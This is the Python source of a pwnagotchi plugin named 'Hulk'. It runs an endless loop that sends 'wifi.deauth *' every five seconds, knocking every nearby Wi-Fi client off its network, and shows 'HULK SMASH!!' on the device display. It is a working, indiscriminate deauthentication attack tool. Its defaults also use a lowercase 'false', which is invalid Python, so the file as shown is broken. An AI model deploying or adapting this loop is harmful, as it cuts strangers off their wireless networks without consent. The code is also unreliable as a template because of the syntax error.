import json
import logging
import os
from time import sleep
from pwnagotchi import plugins


class Hulk(plugins.Plugin):
    __author__ = "SgtStroopwafel, 33197631+dadav@users.noreply.github.com"
    __version__ = "1.0.0"
    __license__ = "GPL3"
    __description__ = "This will put pwnagotchi in hulk mode. Hulk is always angry!"
    __name__ = "Hulk"
    __help__ = "This will put pwnagotchi in hulk mode. Hulk is always angry!"
    __dependencies__ = {
        "apt": ["none"],
        "pip": ["scapy"],
    }
    __defaults__ = {
        "enabled": false,
    }

    def __init__(self):
        self.ready = False
        logging.debug(f"[{self.__class__.__name__}] plugin init")
        self.title = ""
        self.options = dict()
        self.running = False

    def on_loaded(self):
        logging.info(
            f"[{self.__class__.__name__}]  PLUGIN IS LOADED! WHAAAAAAAAAAAAAAAAAA"
        )
        logging.info(f"[{self.__class__.__name__}] plugin loaded")
        self.running = True

    def on_unload(self, ui):
        with ui._lock:
            self.running = False
            logging.info(f"[{self.__class__.__name__}] plugin unloaded")

    def on_webhook(self, path, request):
        logging.info(f"[{self.__class__.__name__}] webhook pressed")

    def on_ready(self, agent):
        display = agent.view()
        i = 0
        while self.running:
            i += 1
            if i % 10 == 0:
                display.set("status", "HULK SMASH!!")
            try:
                agent.run("wifi.deauth *")
            except Exception:
                pass
            finally:
                sleep(5)
